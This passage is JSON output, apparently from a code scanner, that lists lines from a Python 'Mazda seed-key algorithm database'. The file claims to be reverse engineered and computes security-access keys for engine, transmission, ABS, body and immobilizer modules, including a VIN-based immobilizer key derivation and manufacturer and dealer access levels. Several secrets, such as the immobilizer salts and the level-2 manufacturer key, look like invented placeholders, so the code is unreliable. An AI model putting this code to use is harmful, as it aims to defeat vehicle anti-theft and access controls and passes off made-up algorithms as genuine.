"hardware": "ECU", "content": "class MazdaECUType(IntEnum):"}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "\"\"\"Mazda ECU Types\"\"\""}, {"type": "hardware", "line": 22, "hardware": "ECU", "content": "ENGINE_ECU = 0x01"}, {"type": "hardware", "line": 24, "hardware": "immobilizer", "content": "IMMOBILIZER = 0x03"}, {"type": "hardware", "line": 26, "hardware": "ABS", "content": "ABS = 0x05"}, {"type": "hardware", "line": 34, "hardware": "ECU", "content": "Contains all security algorithms for all Mazda ECUs"}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "self.ecu_database = self._initialize_ecu_database()"}, {"type": "hardware", "line": 50, "hardware": "ECU", "content": "\"ENGINE_ECU_2011\": self._algorithm_engine_ecu_2011,"}, {"type": "hardware", "line": 51, "hardware": "TCM", "content": "\"TCM_6SPD\": self._algorithm_tcm_6spd,"}, {"type": "hardware", "line": 52, "hardware": "immobilizer", "content": "\"IMMOBILIZER_2011\": self._algorithm_immobilizer_2011,"}, {"type": "hardware", "line": 53, "hardware": "BCM", "content": "\"BCM_2011\": self._algorithm_bcm_2011,"}, {"type": "hardware", "line": 54, "hardware": "ABS", "content": "\"ABS_2011\": self._algorithm_abs_2011,"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "def _initialize_ecu_database(self) -> Dict[MazdaECUType, Dict[str, Any]]:"}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "\"\"\"Initialize ECU security database\"\"\""}, {"type": "hardware", "line": 70, "hardware": "ECU", "content": "MazdaECUType.ENGINE_ECU: {"}, {"type": "hardware", "line": 71, "hardware": "ECU", "content": "\"algorithm\": \"ENGINE_ECU_2011\","}, {"type": "hardware", "line": 74, "hardware": "ECU", "content": "\"security_levels\": [1, 2, 3, 4, 5, 6],"}, {"type": "hardware", "line": 77, "hardware": "ECU", "content": "MazdaECUType.TRANSMISSION: {"}, {"type": "hardware", "line": 78, "hardware": "TCM", "content": "\"algorithm\": \"TCM_6SPD\","}, {"type": "hardware", "line": 81, "hardware": "ECU", "content": "\"security_levels\": [1, 2],"}, {"type": "hardware", "line": 84, "hardware": "ECU", "content": "MazdaECUType.IMMOBILIZER: {"}, {"type": "hardware", "line": 84, "hardware": "immobilizer", "content": "MazdaECUType.IMMOBILIZER: {"}, {"type": "hardware", "line": 85, "hardware": "immobilizer", "content": "\"algorithm\": \"IMMOBILIZER_2011\","}, {"type": "hardware", "line": 88, "hardware": "ECU", "content": "\"security_levels\": [5],"}, {"type": "hardware", "line": 91, "hardware": "ECU", "content": "MazdaECUType.BODY_CONTROL: {"}, {"type": "hardware", "line": 92, "hardware": "BCM", "content": "\"algorithm\": \"BCM_2011\","}, {"type": "hardware", "line": 95, "hardware": "ECU", "content": "\"security_levels\": [1, 2],"}, {"type": "hardware", "line": 98, "hardware": "ECU", "content": "MazdaECUType.ABS: {"}, {"type": "hardware", "line": 98, "hardware": "ABS", "content": "MazdaECUType.ABS: {"}, {"type": "hardware", "line": 99, "hardware": "ABS", "content": "\"algorithm\": \"ABS_2011\","}, {"type": "hardware", "line": 102, "hardware": "ECU", "content": "\"security_levels\": [1],"}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "vin: Optional[str] = None, security_level: int = 1) -> Optional[bytes]:"}, {"type": "hardware", "line": 110, "hardware": "ECU", "content": "Calculate security key using specified algorithm"}, {"type": "hardware", "line": 113, "hardware": "ECU", "content": "seed: Seed bytes from ECU"}, {"type": "hardware", "line": 115, "hardware": "vehicle", "content": "vin: Vehicle VIN (if required)"}, {"type": "hardware", "line": 116, "hardware": "ECU", "content": "security_level: Security access level"}, {"type": "hardware", "line": 127, "hardware": "ECU", "content": "key = algorithm(seed, vin, security_level)"}, {"type": "hardware", "line": 140, "hardware": "ECU", "content": "def get_ecu_algorithm(self, ecu_type: MazdaECUType) -> Optional[str]:"}, {"type": "hardware", "line": 141, "hardware": "ECU", "content": "\"\"\"Get algorithm name for ECU type\"\"\""}, {"type": "hardware", "line": 142, "hardware": "ECU", "content": "ecu_info = self.ecu_database.get(ecu_type)"}, {"type": "hardware", "line": 143, "hardware": "ECU", "content": "return ecu_info.get(\"algorithm\") if ecu_info else None"}, {"type": "hardware", "line": 145, "hardware": "ECU", "content": "def get_ecu_seed_length(self, ecu_type: MazdaECUType) -> int:"}, {"type": "hardware", "line": 146, "hardware": "ECU", "content": "\"\"\"Get seed length for ECU type\"\"\""}, {"type": "hardware", "line": 147, "hardware": "ECU", "content": "ecu_info = self.ecu_database.get(ecu_type)"}, {"type": "hardware", "line": 148, "hardware": "ECU", "content": "return ecu_info.get(\"seed_length\", 4) if ecu_info else 4"}, {"type": "hardware", "line": 153, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 154, "hardware": "ECU", "content": "\"\"\"Standard 0x27 Security Algorithm\"\"\""}, {"type": "hardware", "line": 170, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 171, "hardware": "ECU", "content": "\"\"\"Enhanced 0x27 Security Algorithm\"\"\""}, {"type": "hardware", "line": 191, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 213, "hardware": "ECU", "content": "def _algorithm_engine_ecu_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 214, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 215, "hardware": "ECU", "content": "\"\"\"2011 Mazdaspeed 3 Engine ECU Algorithm\"\"\""}, {"type": "hardware", "line": 217, "hardware": "ECU", "content": "raise ValueError(\"Engine ECU algorithm requires 4-byte seed\")"}, {"type": "hardware", "line": 231, "hardware": "ECU", "content": "level_factor = level_factors.get(security_level, 0x10)"}, {"type": "hardware", "line": 247, "hardware": "TCM", "content": "def _algorithm_tcm_6spd(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 248, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 251, "hardware": "TCM", "content": "raise ValueError(\"TCM algorithm requires 2-byte seed\")"}, {"type": "hardware", "line": 263, "hardware": "immobilizer", "content": "def _algorithm_immobilizer_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 264, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 265, "hardware": "immobilizer", "content": "\"\"\"2011 Immobilizer System Algorithm\"\"\""}, {"type": "hardware", "line": 267, "hardware": "immobilizer", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "hardware", "line": 270, "hardware": "immobilizer", "content": "raise ValueError(\"Immobilizer algorithm requires VIN\")"}, {"type": "hardware", "line": 273, "hardware": "immobilizer", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "hardware", "line": 273, "hardware": "vehicle", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "hardware", "line": 276, "hardware": "vehicle", "content": "des_key = vehicle_key[:24]  # 24 bytes for 3DES"}, {"type": "hardware", "line": 283, "hardware": "immobilizer", "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}, {"type": "hardware", "line": 284, "hardware": "immobilizer", "content": "\"\"\"Derive immobilizer key from VIN\"\"\""}, {"type": "hardware", "line": 289, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "hardware", "line": 290, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "hardware", "line": 294, "hardware": "BCM", "content": "def _algorithm_bcm_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 295, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 298, "hardware": "BCM", "content": "raise ValueError(\"BCM algorithm requires 4-byte seed\")"}, {"type": "hardware", "line": 316, "hardware": "ABS", "content": "def _algorithm_abs_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 317, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 318, "hardware": "ABS", "content": "\"\"\"2011 ABS Module Algorithm\"\"\""}, {"type": "hardware", "line": 320, "hardware": "ABS", "content": "raise ValueError(\"ABS algorithm requires 4-byte seed\")"}, {"type": "hardware", "line": 339, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 354, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 374, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 396, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 414, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 432, "hardware": "ECU", "content": "security_level: int = 1) -> bytes:"}, {"type": "hardware", "line": 458, "hardware": "ECU", "content": "base_key = b'mazda_manufacturer_key_level2_2024_secure'"}, {"type": "hardware", "line": 483, "hardware": "ECU", "content": "\"ALG_27_STANDARD\": \"Standard 0x27 security access algorithm\","}, {"type": "hardware", "line": 484, "hardware": "ECU", "content": "\"ALG_27_ENHANCED\": \"Enhanced 0x27 algorithm with additional security\","}, {"type": "hardware", "line": 485, "hardware": "ECU", "content": "\"ENGINE_ECU_2011\": \"2011 Mazdaspeed 3 engine ECU specific algorithm\","}, {"type": "hardware", "line": 486, "hardware": "immobilizer", "content": "\"IMMOBILIZER_2011\": \"2011 immobilizer system with VIN-based key derivation\","}, {"type": "hardware", "line": 497, "hardware": "ECU", "content": "\"ENGINE_ECU_2011\": 4,"}, {"type": "hardware", "line": 498, "hardware": "immobilizer", "content": "\"IMMOBILIZER_2011\": 8,"}, {"type": "hardware", "line": 502, "hardware": "TCM", "content": "\"TCM_6SPD\": 2"}, {"type": "hardware", "line": 511, "hardware": "ECU", "content": "\"ENGINE_ECU_2011\": 4,"}, {"type": "hardware", "line": 512, "hardware": "immobilizer", "content": "\"IMMOBILIZER_2011\": 8,"}, {"type": "hardware", "line": 516, "hardware": "TCM", "content": "\"TCM_6SPD\": 2"}, {"type": "hardware", "line": 523, "hardware": "immobilizer", "content": "\"IMMOBILIZER_2011\","}], "security_logic": [{"type": "security_pattern", "line": 4, "pattern": "key", "content": "MAZDA SEED-KEY ALGORITHMS - Complete Security Algorithm Database"}, {"type": "security_pattern", "line": 4, "pattern": "seed", "content": "MAZDA SEED-KEY ALGORITHMS - Complete Security Algorithm Database"}, {"type": "security_pattern", "line": 4, "pattern": "algorithm", "content": "MAZDA SEED-KEY ALGORITHMS - Complete Security Algorithm Database"}, {"type": "security_pattern", "line": 5, "pattern": "algorithm", "content": "Reverse engineered from all Mazda ECU security algorithms"}, {"type": "security_pattern", "line": 8, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 13, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 13, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 15, "pattern": "hash", "content": "from cryptography.hazmat.primitives import hashes"}, {"type": "security_pattern", "line": 31, "pattern": "key", "content": "class MazdaSeedKeyDatabase:"}, {"type": "security_pattern", "line": 31, "pattern": "seed", "content": "class MazdaSeedKeyDatabase:"}, {"type": "security_pattern", "line": 33, "pattern": "key", "content": "Complete Mazda Seed-Key Algorithm Database"}, {"type": "security_pattern", "line": 33, "pattern": "seed", "content": "Complete Mazda Seed-Key Algorithm Database"}, {"type": "security_pattern", "line": 33, "pattern": "algorithm", "content": "Complete Mazda Seed-Key Algorithm Database"}, {"type": "security_pattern", "line": 34, "pattern": "algorithm", "content": "Contains all security algorithms for all Mazda ECUs"}, {"type": "security_pattern", "line": 38, "pattern": "algorithm", "content": "self.algorithm_database = self._initialize_algorithm_database()"}, {"type": "security_pattern", "line": 41, "pattern": "algorithm", "content": "def _initialize_algorithm_database(self) -> Dict[str, Callable]:"}, {"type": "security_pattern", "line": 42, "pattern": "algorithm", "content": "\"\"\"Initialize complete algorithm database\"\"\""}, {"type": "security_pattern", "line": 45, "pattern": "algorithm", "content": "\"ALG_27_STANDARD\": self._algorithm_27_standard,"}, {"type": "security_pattern", "line": 46, "pattern": "algorithm", "content": "\"ALG_27_ENHANCED\": self._algorithm_27_enhanced,"}, {"type": "security_pattern", "line": 47, "pattern": "algorithm", "content": "\"ALG_27_RACE\": self._algorithm_27_race,"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "\"ENGINE_ECU_2011\": self._algorithm_engine_ecu_2011,"}, {"type": "security_pattern", "line": 51, "pattern": "algorithm", "content": "\"TCM_6SPD\": self._algorithm_tcm_6spd,"}, {"type": "security_pattern", "line": 52, "pattern": "algorithm", "content": "\"IMMOBILIZER_2011\": self._algorithm_immobilizer_2011,"}, {"type": "security_pattern", "line": 53, "pattern": "algorithm", "content": "\"BCM_2011\": self._algorithm_bcm_2011,"}, {"type": "security_pattern", "line": 54, "pattern": "algorithm", "content": "\"ABS_2011\": self._algorithm_abs_2011,"}, {"type": "security_pattern", "line": 57, "pattern": "algorithm", "content": "\"MANUFACTURER_LEVEL1\": self._algorithm_manufacturer_level1,"}, {"type": "security_pattern", "line": 58, "pattern": "algorithm", "content": "\"MANUFACTURER_LEVEL2\": self._algorithm_manufacturer_level2,"}, {"type": "security_pattern", "line": 59, "pattern": "algorithm", "content": "\"DEALER_ACCESS\": self._algorithm_dealer_access,"}, {"type": "security_pattern", "line": 62, "pattern": "algorithm", "content": "\"NORTH_AMERICA\": self._algorithm_north_america,"}, {"type": "security_pattern", "line": 63, "pattern": "algorithm", "content": "\"EUROPE\": self._algorithm_europe,"}, {"type": "security_pattern", "line": 64, "pattern": "algorithm", "content": "\"JAPAN\": self._algorithm_japan,"}, {"type": "security_pattern", "line": 71, "pattern": "algorithm", "content": "\"algorithm\": \"ENGINE_ECU_2011\","}, {"type": "security_pattern", "line": 72, "pattern": "seed", "content": "\"seed_length\": 4,"}, {"type": "security_pattern", "line": 73, "pattern": "key", "content": "\"key_length\": 4,"}, {"type": "security_pattern", "line": 78, "pattern": "algorithm", "content": "\"algorithm\": \"TCM_6SPD\","}, {"type": "security_pattern", "line": 79, "pattern": "seed", "content": "\"seed_length\": 2,"}, {"type": "security_pattern", "line": 80, "pattern": "key", "content": "\"key_length\": 2,"}, {"type": "security_pattern", "line": 85, "pattern": "algorithm", "content": "\"algorithm\": \"IMMOBILIZER_2011\","}, {"type": "security_pattern", "line": 86, "pattern": "seed", "content": "\"seed_length\": 8,"}, {"type": "security_pattern", "line": 87, "pattern": "key", "content": "\"key_length\": 8,"}, {"type": "security_pattern", "line": 92, "pattern": "algorithm", "content": "\"algorithm\": \"BCM_2011\","}, {"type": "security_pattern", "line": 93, "pattern": "seed", "content": "\"seed_length\": 4,"}, {"type": "security_pattern", "line": 94, "pattern": "key", "content": "\"key_length\": 4,"}, {"type": "security_pattern", "line": 99, "pattern": "algorithm", "content": "\"algorithm\": \"ABS_2011\","}, {"type": "security_pattern", "line": 100, "pattern": "seed", "content": "\"seed_length\": 4,"}, {"type": "security_pattern", "line": 101, "pattern": "key", "content": "\"key_length\": 4,"}, {"type": "security_pattern", "line": 107, "pattern": "key", "content": "def calculate_key(self, seed: bytes, algorithm_name: str,"}, {"type": "security_pattern", "line": 107, "pattern": "seed", "content": "def calculate_key(self, seed: bytes, algorithm_name: str,"}, {"type": "security_pattern", "line": 107, "pattern": "algorithm", "content": "def calculate_key(self, seed: bytes, algorithm_name: str,"}, {"type": "security_pattern", "line": 110, "pattern": "key", "content": "Calculate security key using specified algorithm"}, {"type": "security_pattern", "line": 110, "pattern": "algorithm", "content": "Calculate security key using specified algorithm"}, {"type": "security_pattern", "line": 113, "pattern": "seed", "content": "seed: Seed bytes from ECU"}, {"type": "security_pattern", "line": 114, "pattern": "algorithm", "content": "algorithm_name: Algorithm to use"}, {"type": "security_pattern", "line": 119, "pattern": "key", "content": "Calculated key bytes or None if failed"}, {"type": "security_pattern", "line": 122, "pattern": "algorithm", "content": "if algorithm_name not in self.algorithm_database:"}, {"type": "security_pattern", "line": 123, "pattern": "algorithm", "content": "logger.error(f\"Unknown algorithm: {algorithm_name}\")"}, {"type": "security_pattern", "line": 126, "pattern": "algorithm", "content": "algorithm = self.algorithm_database[algorithm_name]"}, {"type": "security_pattern", "line": 127, "pattern": "key", "content": "key = algorithm(seed, vin, security_level)"}, {"type": "security_pattern", "line": 127, "pattern": "seed", "content": "key = algorithm(seed, vin, security_level)"}, {"type": "security_pattern", "line": 127, "pattern": "algorithm", "content": "key = algorithm(seed, vin, security_level)"}, {"type": "security_pattern", "line": 129, "pattern": "key", "content": "if key:"}, {"type": "security_pattern", "line": 130, "pattern": "key", "content": "logger.debug(f\"Calculated key using {algorithm_name}: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 130, "pattern": "algorithm", "content": "logger.debug(f\"Calculated key using {algorithm_name}: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 132, "pattern": "key", "content": "logger.error(f\"Algorithm {algorithm_name} returned no key\")"}, {"type": "security_pattern", "line": 132, "pattern": "algorithm", "content": "logger.error(f\"Algorithm {algorithm_name} returned no key\")"}, {"type": "security_pattern", "line": 134, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 137, "pattern": "key", "content": "logger.error(f\"Error calculating key with {algorithm_name}: {e}\")"}, {"type": "security_pattern", "line": 137, "pattern": "algorithm", "content": "logger.error(f\"Error calculating key with {algorithm_name}: {e}\")"}, {"type": "security_pattern", "line": 140, "pattern": "algorithm", "content": "def get_ecu_algorithm(self, ecu_type: MazdaECUType) -> Optional[str]:"}, {"type": "security_pattern", "line": 141, "pattern": "algorithm", "content": "\"\"\"Get algorithm name for ECU type\"\"\""}, {"type": "security_pattern", "line": 143, "pattern": "algorithm", "content": "return ecu_info.get(\"algorithm\") if ecu_info else None"}, {"type": "security_pattern", "line": 145, "pattern": "seed", "content": "def get_ecu_seed_length(self, ecu_type: MazdaECUType) -> int:"}, {"type": "security_pattern", "line": 146, "pattern": "seed", "content": "\"\"\"Get seed length for ECU type\"\"\""}, {"type": "security_pattern", "line": 148, "pattern": "seed", "content": "return ecu_info.get(\"seed_length\", 4) if ecu_info else 4"}, {"type": "security_pattern", "line": 152, "pattern": "seed", "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 152, "pattern": "algorithm", "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 154, "pattern": "algorithm", "content": "\"\"\"Standard 0x27 Security Algorithm\"\"\""}, {"type": "security_pattern", "line": 155, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 156, "pattern": "seed", "content": "raise ValueError(\"Standard algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 156, "pattern": "algorithm", "content": "raise ValueError(\"Standard algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 158, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 162, "pattern": "seed", "content": "temp = seed[i] ^ 0x73"}, {"type": "security_pattern", "line": 165, "pattern": "key", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 167, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 169, "pattern": "seed", "content": "def _algorithm_27_enhanced(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 169, "pattern": "algorithm", "content": "def _algorithm_27_enhanced(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 171, "pattern": "algorithm", "content": "\"\"\"Enhanced 0x27 Security Algorithm\"\"\""}, {"type": "security_pattern", "line": 172, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 173, "pattern": "seed", "content": "raise ValueError(\"Enhanced algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 173, "pattern": "algorithm", "content": "raise ValueError(\"Enhanced algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 175, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 178, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 186, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 188, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 190, "pattern": "seed", "content": "def _algorithm_27_race(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 190, "pattern": "algorithm", "content": "def _algorithm_27_race(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 192, "pattern": "algorithm", "content": "\"\"\"Race/Performance 0x27 Algorithm\"\"\""}, {"type": "security_pattern", "line": 193, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 194, "pattern": "seed", "content": "raise ValueError(\"Race algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 194, "pattern": "algorithm", "content": "raise ValueError(\"Race algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 196, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 199, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 209, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 211, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 213, "pattern": "seed", "content": "def _algorithm_engine_ecu_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 213, "pattern": "algorithm", "content": "def _algorithm_engine_ecu_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 215, "pattern": "algorithm", "content": "\"\"\"2011 Mazdaspeed 3 Engine ECU Algorithm\"\"\""}, {"type": "security_pattern", "line": 216, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 217, "pattern": "seed", "content": "raise ValueError(\"Engine ECU algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 217, "pattern": "algorithm", "content": "raise ValueError(\"Engine ECU algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 219, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 234, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 243, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 245, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 247, "pattern": "seed", "content": "def _algorithm_tcm_6spd(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 247, "pattern": "algorithm", "content": "def _algorithm_tcm_6spd(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 249, "pattern": "algorithm", "content": "\"\"\"6-Speed Transmission Control Module Algorithm\"\"\""}, {"type": "security_pattern", "line": 250, "pattern": "seed", "content": "if len(seed) != 2:"}, {"type": "security_pattern", "line": 251, "pattern": "seed", "content": "raise ValueError(\"TCM algorithm requires 2-byte seed\")"}, {"type": "security_pattern", "line": 251, "pattern": "algorithm", "content": "raise ValueError(\"TCM algorithm requires 2-byte seed\")"}, {"type": "security_pattern", "line": 253, "pattern": "key", "content": "key = bytearray(2)"}, {"type": "security_pattern", "line": 256, "pattern": "key", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 256, "pattern": "seed", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 257, "pattern": "key", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 257, "pattern": "seed", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 258, "pattern": "key", "content": "key[0] ^= 0x47"}, {"type": "security_pattern", "line": 259, "pattern": "key", "content": "key[1] ^= 0x11"}, {"type": "security_pattern", "line": 261, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 263, "pattern": "seed", "content": "def _algorithm_immobilizer_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 263, "pattern": "algorithm", "content": "def _algorithm_immobilizer_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 265, "pattern": "algorithm", "content": "\"\"\"2011 Immobilizer System Algorithm\"\"\""}, {"type": "security_pattern", "line": 266, "pattern": "seed", "content": "if len(seed) != 8:"}, {"type": "security_pattern", "line": 267, "pattern": "seed", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 267, "pattern": "algorithm", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 270, "pattern": "algorithm", "content": "raise ValueError(\"Immobilizer algorithm requires VIN\")"}, {"type": "security_pattern", "line": 273, "pattern": "key", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "security_pattern", "line": 276, "pattern": "key", "content": "des_key = vehicle_key[:24]  # 24 bytes for 3DES"}, {"type": "security_pattern", "line": 277, "pattern": "key", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 277, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 277, "pattern": "cipher", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 278, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 278, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 280, "pattern": "key", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 280, "pattern": "encrypt", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 280, "pattern": "seed", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 281, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 283, "pattern": "key", "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}, {"type": "security_pattern", "line": 284, "pattern": "key", "content": "\"\"\"Derive immobilizer key from VIN\"\"\""}, {"type": "security_pattern", "line": 288, "pattern": "key", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 288, "pattern": "hash", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 289, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "security_pattern", "line": 289, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "security_pattern", "line": 290, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "security_pattern", "line": 290, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "security_pattern", "line": 292, "pattern": "key", "content": "return key[:24]"}, {"type": "security_pattern", "line": 294, "pattern": "seed", "content": "def _algorithm_bcm_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 294, "pattern": "algorithm", "content": "def _algorithm_bcm_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 296, "pattern": "algorithm", "content": "\"\"\"2011 Body Control Module Algorithm\"\"\""}, {"type": "security_pattern", "line": 297, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 298, "pattern": "seed", "content": "raise ValueError(\"BCM algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 298, "pattern": "algorithm", "content": "raise ValueError(\"BCM algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 300, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 303, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 312, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 314, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 316, "pattern": "seed", "content": "def _algorithm_abs_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 316, "pattern": "algorithm", "content": "def _algorithm_abs_2011(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 318, "pattern": "algorithm", "content": "\"\"\"2011 ABS Module Algorithm\"\"\""}, {"type": "security_pattern", "line": 319, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 320, "pattern": "seed", "content": "raise ValueError(\"ABS algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 320, "pattern": "algorithm", "content": "raise ValueError(\"ABS algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 322, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 325, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 334, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 336, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 338, "pattern": "seed", "content": "def _algorithm_manufacturer_level1(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 338, "pattern": "algorithm", "content": "def _algorithm_manufacturer_level1(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 340, 